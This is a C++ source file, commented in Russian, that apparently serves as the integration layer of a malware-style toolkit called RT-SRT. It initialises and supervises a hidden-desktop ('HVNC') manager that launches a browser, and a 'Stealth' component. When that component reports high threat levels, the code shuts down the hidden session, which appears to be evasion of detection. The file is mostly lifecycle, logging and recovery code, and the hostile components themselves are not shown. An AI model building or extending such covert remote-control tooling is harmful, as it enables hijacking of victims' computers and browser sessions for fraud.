#include "integration.h"
#include <memory>
#include <sstream>
#include <chrono>
#include <fstream>

// Функция LogWarning
extern void LogWarning(const char* message);

namespace RTSRTIntegration {
    
    // Статические переменные для отслеживания состояния
    static bool g_systemInitialized = false;
    static bool g_autoRecoveryEnabled = false;
    static std::chrono::steady_clock::time_point g_lastHealthCheck;
    
    bool InitializeAllSystems() {
        if (g_systemInitialized) {
            LogWarning("[INTEGRATION] Systems already initialized");
            return true;
        }
        
        LogInfo("[INTEGRATION] Initializing RT-SRT integrated systems");
        
        try {
            // 1. Инициализация логирования (уже должно быть инициализировано)
            LogInfo("[INTEGRATION] Logger system ready");
            
            // 2. Инициализация Stealth системы
            if (!g_stealthSystem) {
                g_stealthSystem = std::make_unique<StealthSystem>();
                
                StealthConfig stealthConfig;
                stealthConfig.enableAutoResponse = true;
                stealthConfig.enableContinuousMonitoring = true;
                stealthConfig.autoResponseThreshold = SecurityThreatLevel::MEDIUM;
                
                if (!g_stealthSystem->Initialize(stealthConfig)) {
                    LogError("[INTEGRATION] Failed to initialize Stealth system");
                    return false;
                }
                
                // Регистрируем обработчик угроз
                g_stealthSystem->RegisterThreatHandler(OnThreatDetected);
            }
            
            // 3. Инициализация HVNC системы
            if (!g_hvncManager) {
                g_hvncManager = std::make_unique<HVNCManager>();
                
                HVNCConfig hvncConfig;
                hvncConfig.enableAutoRecovery = true;
                hvncConfig.enableResourceMonitoring = true;
                hvncConfig.maxWorkerThreads = 2; // Консервативное значение
                hvncConfig.commandTimeoutMs = 30000;
                
                g_hvncManager->SetConfig(hvncConfig);
            }
            
            g_systemInitialized = true;
            g_lastHealthCheck = std::chrono::steady_clock::now();
            
            LogInfo("[INTEGRATION] RT-SRT systems initialized successfully");
            return true;
            
        } catch (const std::exception& e) {
            LogError(("[INTEGRATION] Exception during initialization: " + std::string(e.what())).c_str());
            return false;
        }
    }
    
    void ShutdownAllSystems() {
        if (!g_systemInitialized) {
            return;
        }
        
        LogInfo("[INTEGRATION] Shutting down RT-SRT systems");
        
        try {
            // Останавливаем HVNC если активно
            if (g_hvncManager && g_hvncManager->GetStatus() != HVNCStatus::STOPPED) {
                StopHVNCSystem();
            }
            
            // Останавливаем Stealth систему
            if (g_stealthSystem && g_stealthSystem->IsActive()) {
                StopStealthSystem();
            }
            
            // Очищаем ресурсы
            g_hvncManager.reset();
            g_stealthSystem.reset();
            
            g_systemInitialized = false;
            
            LogInfo("[INTEGRATION] RT-SRT systems shutdown completed");
            
        } catch (const std::exception& e) {
            LogError(("[INTEGRATION] Exception during shutdown: " + std::string(e.what())).c_str());
        }
    }
    
    bool StartHVNCSystem(const std::string& browserPath) {
        if (!g_systemInitialized || !g_hvncManager) {
            LogError("[INTEGRATION] Cannot start HVNC: system not initialized");
            return false;
        }
        
        LogInfo("[INTEGRATION] Starting HVNC system");
        
        try {
            bool success = g_hvncManager->StartSession(browserPath);
            
            if (success) {
                LogInfo("[INTEGRATION] HVNC system started successfully");
                OnSystemStateChange();
            } else {
                LogError("[INTEGRATION] Failed to start HVNC system");
                OnHVNCError(g_hvncManager->GetLastError());
            }
            
            return success;
            
        } catch (const std::exception& e) {
            LogError(("[INTEGRATION] Exception starting HVNC: " + std::string(e.what())).c_str());
            return false;
        }
    }
    
    bool StopHVNCSystem() {
        if (!g_hvncManager) {
            return true; // Уже остановлено
        }
        
        LogInfo("[INTEGRATION] Stopping HVNC system");
        
        try {
            bool success = g_hvncManager->StopSession(15000); // 15 секунд таймаут
            
            if (success) {
                LogInfo("[INTEGRATION] HVNC system stopped successfully");
            } else {
                LogWarning("[INTEGRATION] HVNC system stop completed with warnings");
            }
            
            OnSystemStateChange();
            return success;
            
        } catch (const std::exception& e) {
            LogError(("[INTEGRATION] Exception stopping HVNC: " + std::string(e.what())).c_str());
            return false;
        }
    }
    
    bool StartStealthSystem() {
        if (!g_systemInitialized || !g_stealthSystem) {
            LogError("[INTEGRATION] Cannot start Stealth: system not initialized");
            return false;
        }
        
        LogInfo("[INTEGRATION] Starting Stealth system");
        
        try {
            bool success = g_stealthSystem->Start();
            
            if (success) {
                LogInfo("[INTEGRATION] Stealth system started successfully");
                OnSystemStateChange();
            } else {
                LogError("[INTEGRATION] Failed to start Stealth system");
            }
            
            return success;
            
        } catch (const std::exception& e) {
            LogError(("[INTEGRATION] Exception starting Stealth: " + std::string(e.what())).c_str());
            return false;
        }
    }
    
    bool StopStealthSystem() {
        if (!g_stealthSystem) {
            return true; // Уже остановлено
        }
        
        LogInfo("[INTEGRATION] Stopping Stealth system");
        
        try {
            bool success = g_stealthSystem->Stop(10000); // 10 секунд таймаут
            
            if (success) {
                LogInfo("[INTEGRATION] Stealth system stopped successfully");
            } else {
                LogWarning("[INTEGRATION] Stealth system stop completed with warnings");
            }
            
            OnSystemStateChange();
            return success;
            
        } catch (const std::exception& e) {
            LogError(("[INTEGRATION] Exception stopping Stealth: " + std::string(e.what())).c_str());
            return false;
        }
    }
    
    bool IsHVNCActive() {
        return g_hvncManager && (g_hvncManager->GetStatus() == HVNCStatus::RUNNING);
    }
    
    bool IsStealthActive() {
        return g_stealthSystem && g_stealthSystem->IsActive();
    }
    
    HVNCStatus GetHVNCStatus() {
        return g_hvncManager ? g_hvncManager->GetStatus() : HVNCStatus::STOPPED;
    }
    
    SecurityThreatLevel GetCurrentThreatLevel() {
        return g_stealthSystem ? g_stealthSystem->GetCurrentThreatLevel() : SecurityThreatLevel::NONE;
    }
    
    void OnThreatDetected(const ThreatInfo& threat) {
        // Интегрированная обработка угроз
        std::stringstream ss;
        ss << "[INTEGRATION_THREAT] " << static_cast<int>(threat.type) 
           << " - Level: " << static_cast<int>(threat.level) 
           << " - " << threat.description;
        
        if (threat.level >= SecurityThreatLevel::HIGH) {
            LogError(ss.str().c_str());
            
            // При высоких угрозах - останавливаем HVNC для безопасности
            if (IsHVNCActive()) {
                LogWarning("[INTEGRATION] High threat detected - stopping HVNC for safety");
                StopHVNCSystem();
            }
            
        } else {
            LogWarning(ss.str().c_str());
        }
        
        // Триггерим автовосстановление при критических угрозах
        if (threat.level == SecurityThreatLevel::CRITICAL && g_autoRecoveryEnabled) {
            LogWarning("[INTEGRATION] Critical threat - triggering recovery");
            TriggerSystemRecovery();
        }
    }
    
    void OnHVNCError(HVNCError error) {
        std::string errorDesc;
        
        switch (error) {
            case HVNCError::DESKTOP_CREATION_FAILED:
                errorDesc = "Desktop creation failed";
                break;
            case HVNCError::BROWSER_LAUNCH_FAILED:
                errorDesc = "Browser launch failed";
                break;
            case HVNCError::WORKER_THREAD_CRASHED:
                errorDesc = "Worker thread crashed";
                break;
            case HVNCError::RESOURCE_LEAK_DETECTED:
                errorDesc = "Resource leak detected";
                break;
            case HVNCError::TIMEOUT_EXCEEDED:
                errorDesc = "Timeout exceeded";
                break;
            default:
                errorDesc = "Unknown error";
                break;
        }
        
        LogError(("[INTEGRATION_HVNC_ERROR] " + errorDesc).c_str());
        
        // Автоматическое восстановление при ошибках ресурсов
        if (error == HVNCError::RESOURCE_LEAK_DETECTED && g_autoRecoveryEnabled) {
            LogInfo("[INTEGRATION] Resource leak detected - triggering recovery");
            TriggerSystemRecovery();
        }
    }
    
    void OnSystemStateChange() {
        LogInfo("[INTEGRATION] System state changed");
        LogSystemStatus();
    }
    
    SystemHealth GetSystemHealth() {
        SystemHealth health = {0};
        
        // HVNC здоровье
        if (g_hvncManager) {
            health.hvncStatus = g_hvncManager->GetStatus();
            health.hvncHealthy = (health.hvncStatus == HVNCStatus::RUNNING || 
                                 health.hvncStatus == HVNCStatus::STOPPED);
            
            if (health.hvncStatus == HVNCStatus::RUNNING) {
                // Получаем статистики ресурсов
                // auto stats = g_hvncManager->GetResourceStats();
                // health.totalHandles = stats.handleCount;
                // health.totalMemoryMB = stats.workingSetSize / (1024 * 1024);
            }
        } else {
            health.hvncHealthy = true; // Не инициализировано = здорово
            health.hvncStatus = HVNCStatus::STOPPED;
        }
        
        // Stealth здоровье
        if (g_stealthSystem) {
            health.stealthHealthy = g_stealthSystem->IsActive();
            health.threatLevel = g_stealthSystem->GetCurrentThreatLevel();
        } else {
            health.stealthHealthy = true;
            health.threatLevel = SecurityThreatLevel::NONE;
        }
        
        // Общее здоровье ресурсов
        health.resourcesHealthy = (health.totalHandles < 1000) && 
                                 (health.totalMemoryMB < 512);
        
        return health;
    }
    
    bool IsSystemHealthy() {
        SystemHealth health = GetSystemHealth();
        
        return health.hvncHealthy && 
               health.stealthHealthy && 
               health.resourcesHealthy &&
               (health.threatLevel <= SecurityThreatLevel::MEDIUM);
    }
    
    void LogSystemStatus() {
        if (!g_systemInitialized) {
            LogInfo("[INTEGRATION_STATUS] Systems not initialized");
            return;
        }
        
        SystemHealth health = GetSystemHealth();
        
        std::stringstream ss;
        ss << "[INTEGRATION_STATUS] ";
        ss << "HVNC: " << (health.hvncHealthy ? "OK" : "ERROR") << " ";
        ss << "Stealth: " << (health.stealthHealthy ? "OK" : "ERROR") << " ";
        ss << "Resources: " << (health.resourcesHealthy ? "OK" : "WARN") << " ";
        ss << "Threat Level: " << static_cast<int>(health.threatLevel);
        
        if (IsSystemHealthy()) {
            LogInfo(ss.str().c_str());
        } else {
            LogWarning(ss.str().c_str());
        }
        
        g_lastHealthCheck = std::chrono::steady_clock::now();
    }
    
    bool EnableAutoRecovery() {
        g_autoRecoveryEnabled = true;
        LogInfo("[INTEGRATION] Auto-recovery enabled");
        return true;
    }
    
    bool DisableAutoRecovery() {
        g_autoRecoveryEnabled = false;
        LogInfo("[INTEGRATION] Auto-recovery disabled");
        return true;
    }
    
    bool TriggerSystemRecovery() {
        LogWarning("[INTEGRATION] Triggering system recovery");
        
        try {
            // 1. Останавливаем HVNC если активно
            if (IsHVNCActive()) {
                LogInfo("[INTEGRATION] Stopping HVNC for recovery");
                StopHVNCSystem();
                Sleep(2000); // Пауза для очистки ресурсов
            }
            
            // 2. Перезапускаем Stealth систему
            if (g_stealthSystem) {
                LogInfo("[INTEGRATION] Restarting Stealth system");
                g_stealthSystem->Stop(5000);
                Sleep(1000);
                g_stealthSystem->Start();
            }
            
            // 3. Принудительная очистка ресурсов
            LogInfo("[INTEGRATION] Performing resource cleanup");
            
            // Здесь можно добавить дополнительную очистку:
            // - Закрытие открытых дескрипторов
            // - Освобождение памяти
            // - Сброс кэшей
            
            // 4. Пауза перед возможным перезапуском HVNC
            Sleep(3000);
            
            LogInfo("[INTEGRATION] System recovery completed");
            OnSystemStateChange();
            
            return true;
            
        } catch (const std::exception& e) {
            LogError(("[INTEGRATION] Exception during recovery: " + std::string(e.what())).c_str());
            return false;
        }
    }
    
    std::string GenerateSystemReport() {
        std::stringstream report;
        SystemHealth health = GetSystemHealth();
        
        report << "=== RT-SRT System Report ===\n";
        report << "Generated: " << GetTickCount() << "\n";
        report << "Initialized: " << (g_systemInitialized ? "YES" : "NO") << "\n";
        report << "Auto Recovery: " << (g_autoRecoveryEnabled ? "ENABLED" : "DISABLED") << "\n\n";
        
        report << "=== HVNC Status ===\n";
        report << "Active: " << (IsHVNCActive() ? "YES" : "NO") << "\n";
        report << "Status: " << static_cast<int>(health.hvncStatus) << "\n";
        report << "Healthy: " << (health.hvncHealthy ? "YES" : "NO") << "\n\n";
        
        report << "=== Stealth Status ===\n";
        report << "Active: " << (IsStealthActive() ? "YES" : "NO") << "\n";
        report << "Healthy: " << (health.stealthHealthy ? "YES" : "NO") << "\n";
        report << "Threat Level: " << static_cast<int>(health.threatLevel) << "\n\n";
        
        report << "=== Resources ===\n";
        report << "Healthy: " << (health.resourcesHealthy ? "YES" : "NO") << "\n";
        report << "Handles: " << health.totalHandles << "\n";
        report << "Memory MB: " << health.totalMemoryMB << "\n\n";
        
        report << "=== Overall Health ===\n";
        report << "System Healthy: " << (IsSystemHealthy() ? "YES" : "NO") << "\n";
        
        return report.str();
    }
    
    std::string GeneratePerformanceReport() {
        std::stringstream report;
        
        auto now = std::chrono::steady_clock::now();
        auto timeSinceLastCheck = std::chrono::duration_cast<std::chrono::seconds>(
            now - g_lastHealthCheck).count();
        
        report << "=== RT-SRT Performance Report ===\n";
        report << "Last Health Check: " << timeSinceLastCheck << " seconds ago\n";
        
        if (g_stealthSystem) {
            auto threats = g_stealthSystem->GetThreatHistory();
            report << "Total Threats Detected: " << threats.size() << "\n";
            
            int criticalThreats = 0;
            for (const auto& threat : threats) {
                if (threat.level == SecurityThreatLevel::CRITICAL) {
                    criticalThreats++;
                }
            }
            report << "Critical Threats: " << criticalThreats << "\n";
        }
        
        // Дополнительные метрики производительности могут быть добавлены здесь
        
        return report.str();
    }
    
    void ExportDiagnosticData(const std::string& filepath) {
        try {
            std::ofstream file(filepath);
            if (!file.is_open()) {
                LogError(("[INTEGRATION] Failed to open diagnostic file: " + filepath).c_str());
                return;
            }
            
            file << GenerateSystemReport() << "\n\n";
            file << GeneratePerformanceReport() << "\n\n";
            
            // Добавляем детальную информацию об угрозах
            if (g_stealthSystem) {
                auto threats = g_stealthSystem->GetThreatHistory();
                file << "=== Threat History ===\n";
                for (size_t i = 0; i < threats.size(); ++i) {
                    const auto& threat = threats[i];
                    file << "Threat " << (i+1) << ":\n";
                    file << "  Type: " << static_cast<int>(threat.type) << "\n";
                    file << "  Level: " << static_cast<int>(threat.level) << "\n";
                    file << "  Description: " << threat.description << "\n";
                    file << "  Detected At: " << threat.detectedAt << "\n";
                    file << "  Resolved: " << (threat.resolved ? "YES" : "NO") << "\n\n";
                }
            }
            
            file.close();
            LogInfo(("[INTEGRATION] Diagnostic data exported to: " + filepath).c_str());
            
        } catch (const std::exception& e) {
            LogError(("[INTEGRATION] Exception exporting diagnostics: " + std::string(e.what())).c_str());
        }
    }
    
} // namespace RTSRTIntegration